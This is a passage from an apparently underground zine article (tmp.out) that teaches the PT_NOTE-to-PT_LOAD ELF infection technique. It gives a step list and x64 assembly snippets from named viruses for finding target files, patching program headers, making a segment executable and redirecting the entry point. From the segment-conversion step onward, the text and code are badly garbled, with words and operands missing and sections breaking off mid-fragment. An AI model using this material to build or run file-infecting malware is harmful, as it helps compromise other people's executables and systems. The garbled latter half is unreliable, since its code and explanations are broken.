Implementing the PT_NOTE Infection Method in x64 Assembly   │                   █   │
~ sblip and the tmp.out crew                                └───────────────────█ ──┘

In this first issue of tmp.out, we have supplied several examples of the
PT_NOTE->PT_LOAD infection algorithm, three in x64 asm and one in Rust. 
For those learning the craft I thought it useful to address implementing some of the 
specific steps in x64 assembly. In March 2019 while working on a golang rewrite of 
the backdoorfactory, I wrote a breakdown of implementing the algorithm in golang at 
the link below, for those interested in doing fun ELF things in golang:

  https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/

The algorithm for x64 is of course the same, however I will provide some code 
snippets below that I hope will be of help for the aspiring x64 assembly ELF 
programmer. 

We can use the same steps listed in the above article as a reference, though the
order things are done in may change based on the implementation. Some methods write 
a new file to disk and then copy over it, while others write to the file directly.

From the above link, a generic list of steps to implement the PT_NOTE->PT_LOAD 
infection algorithm:

  1. Open the ELF file to be injected
  2. Save the original entry point, e_entry
  3. Parse the program header table, looking for a PT_NOTE segment
  4. Convert the PT_NOTE segment to a PT_LOAD segment
  5. Change the memory protections for this segment to allow executable instructions
  6. Change the entry point address to an area that will not conflict with the 
     original program execution.
  7. Adjust the size on disk and virtual memory size to account for the size of the 
     injected code
  8. Point the offset of our converted segment to the end of the original binary, 
     where we will store the new code
  9. Patch the end of the code with instructions to jump to the original entry point
 10. Add our injected code to the end of the file
*11. Write the file back to disk, over the original file* -- we will not cover this 
     implementation variant here, which creates	a new temporary ELF binary on disk 
     and overwrites the host, as referenced above.

We will loosely follow the above steps, however the reader should keep in mind that 
some of them may be performed out of order (and some cannot be performed until others
have) - but in the end all the steps must be taken.

1. Open the ELF file to be injected:

The syscall getdents64() syscall is how we find files on 64 bit systems. The function
is defined as:

  int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

We will leave implementing getdents64() as an exercise for the reader - There are 
several examples of it in the code distributed with this publication, including in 
Midrashim, kropotkin, Eng3ls, and Bak0unin.

For the ELF historians, I wrote a terrible (and now entirely outdated) article 20 
years ago about doing this in 32-bit AT&T syntax, located here:

  https://tmpout.sh/papers/getdents.old.att.syntax.txt

Assuming we have called getdents64() and stored the directory entry struct on the 
stack, we can see from looking at it:

  struct linux_dirent {
      unsigned long  d_ino;     /* Inode number */
      unsigned long  d_off;     /* Offset to next linux_dirent */
      unsigned short d_reclen;  /* Length of this linux_dirent */
      char           d_name[];  /* Filename (null-terminated) */
                        /* length is actually (d_reclen - 2 -
                           offsetof(struct linux_dirent, d_name)) */
      /*
      char           pad;       // Zero padding byte
      char           d_type;    // File type (only since Linux
                                // 2.6.4); offset is (d_reclen - 1)
      */
  }

that the null terminated file name d_name is at the offset [rsp+18] or [rsp+0x12]

  d_ino is bytes 0-7              - unsigned long
  d_off is bytes 8-15             - unsigned long
  d_reclen is bytes 16-17         - unsigned short
  d_name starts on the 18th byte. - null terminated file name

for our call to open(), int open(const char *pathname, int flags, mode_t mode);

  - rax will hold the syscall number, 2
  - rdi will hold the file name d_name, in our case [rsp+18]
  - rsi will hold the flags, which could either be O_RDONLY (0) or O_RDWR (02), 
    depending on how our vx works
  - rdx would hold the mode, but we do not need this and will zero it out.

So the following code:

  mov rax, 2         ; open syscall
  mov rdi, [rsp+18]  ; d_name from the dirent struct that starts at the beginning 
                     ; of the stack
  mov rsi, 2         ; O_RDWR / Read and Write
  syscall

will return a file descriptor in rax if successful. If 0 or negative, an error has
occurred opening the file.

  cmp rax, 0
  jng file_open_error

or
  test rax, rax
  js file_open_error

2. Save the original entry point, e_entry:

In TMZ's Midrashim, he stores the original entry point in the r14 register for later
use, which he has copied onto the stack. The high registers r13, r14, and r15 are 
good places to store data/addresses for later use, as they are not clobbered by 
syscalls.

  ; Stack buffer:
  ; r15 + 0 = stack buffer (10000 bytes) = stat
  ; r15 + 48 = stat.st_size
  ; r15 + 144 = ehdr
  ; r15 + 148 = ehdr.class
  ; r15 + 152 = ehdr.pad
  ; r15 + 168 = ehdr.entry
  ---cut---
  
  mov r14, [r15 + 168]  ; storing target original ehdr.entry from [r15 + 168] in r14

3. Parse the program header table, looking for the PT_NOTE segment:

As you probably intuited from the name of this article, our goal is to convert a 
PT_NOTE segment into a loadable PT_LOAD segment, with rx (or rwx) permissions.
I would be remiss not to mention that this algorithm does not work 
"cookie-cutter-out-of-the box" for some binaries such as golang binaries, and any
binaries compiled with the -fcf-protection flag, without even more magical fuckery
that we haven't done (or seen) yet. Next zine content, Every0ne? 

Aside from the edge cases, the basic concept is simple - PT_LOAD segments are 
actually loaded into memory when an ELF binary is run - PT_NOTE segments are not.
However, if we change a PT_NOTE section to type PT_LOAD, and change the memory 
permissions to at least read and execute, we can put code that WE want to run there,
write our data to the end of the original file, and change the associated Program 
Header Table entry variables to facilitate loading it correctly.

We put a value in the virtual address field v_addr that is very high in memory, which
won't interfere with normal program execution. We then patch the original entry point
to jump to our new PT_LOAD segment code first, which does whatever it does, and then 
calls the original program code.

A 64-bit ELF Program Header Table entry has the following structure:

  typedef struct {
      uint32_t   p_type;   // 4 bytes
      uint32_t   p_flags;  // 4 bytes
      Elf64_Off  p_offset; // 8 bytes
      Elf64_Addr p_vaddr;  // 8 bytes
      Elf64_Addr p_paddr;  // 8 bytes
      uint64_t   p_filesz; // 8 bytes
      uint64_t   p_memsz;  // 8 bytes
      uint64_t   p_align;  // 8 bytes
  } Elf64_Phdr;


In this code snippet from kropotkin.s, we cycle through each program header table 
entry by loading the offset of the PHT into rbx, the number of PHT entries into ecx,
and reading the first 4 bytes at the beginning of the entry looking for a value of 4,
which is the number designated for segments of type PT_NOTE.  

parse_phdr:
  xor rcx, rcx                       ; zero out rcx
  xor rdx, rdx                       ; zero out rdx
  mov cx, word [rax+e_hdr.phnum]     ; rcx contains the number of entries in the PHT
  mov rbx, qword [rax+e_hdr.phoff]   ; rbx contains the offset of the PHT
  mov dx, word [rax+e_hdr.phentsize] ; rdx contains the size of an entry in the PHT

  loop_phdr:
      add rbx, rdx                   ; for every iteration, add size of a PHT entry
      dec rcx                        ; decrease phnum until we've iterated through 
                                     ; all program headers or found a PT_NOTE segment
      cmp dword [rax+rbx+e_phdr.type], 0x4  ; if 4, we have found a PT_NOTE segment,
                                            ; and head off to infect it
      je pt_note_found
      cmp rcx, 0
      jg loop_phdr
      ...
      ...
  pt_note_found:

4. Convert the PT_NOTE segment to a PT_LOAD segment:

To convert a PT_NOTE segment into a PT_LOAD segment, we must change a few values in
the Program Header Table entry that describes the segment.

Note that 32-bit ELF binaries have a different PHT entry structure, with the p_flags
value as the 7th entry in the struct, as opposed to being the 2nd entry in its 64-bit
counterpart.

  typedef struct {
      uint32_t   p_type;  <-- Change this value to PT_LOAD 1
 uint32_t p_flags; <-- at least Read+Execute permissions
 Elf64_Off p_offset;
 Elf64_Addr p_vaddr; very high virtual addr where the segment will be loaded
 p_paddr;
 uint64_t p_filesz;
 p_memsz;
 p_align;
 } Elf64_Phdr;

First, p_type must changed from PT_NOTE, which is 4, PT_LOAD, 1.

Second, p_flags to, least, allow Read and Execute access. This a standard bitmask just like unix file permissions, with

 PF_X PF_W == 2
 PF_R 4

In fasm syntax,
as seen below, done simply by typing "PF_R or PF_X"

Third, we need choose an address for new virus data loaded. A common technique pick address, 0xc000000, that unlikely overlap with existing segment. We add stat.st_size size, in the
below case has been retrieved r15+48 stored r13, then add
0xc000000. store
p_vaddr.

From TMZ's Midrashim:

 .patch_phdr:
 mov dword [r15 + 208], ; change phdr type 208]
PT_NOTE (1)
 212], phdr.flags 212] (1) | (4)
 pop rax restore target EOF offset into rax
 216], phdr.offset 216] =target offset

 240], v_stop - v_start 5 size phdr.filesz 240] jmp original ehdr.entry
 248], phdr.memsz 248] ehdr.entry

5. memory protections executable instructions:

8. Point our converted end binary, code:

 Previously Midrashim, 
                                                code was executed:
 rdx, SEEK_END
 rax, SYS_LSEEK
 syscall getting push saving EOF

 In .patch_phdr, location restoring offset


9. Patch instructions jump point:

 Example #1, using algorithm Binjection:

 .write_patched_jmp:
 EOF
 rdi, r9 contains fd
 rsi, 0 seek 0
 SEEK_END start file
 SYS_LSEEK lseek syscall
 rax

 rdx instruction
 sub r14, subtract stored
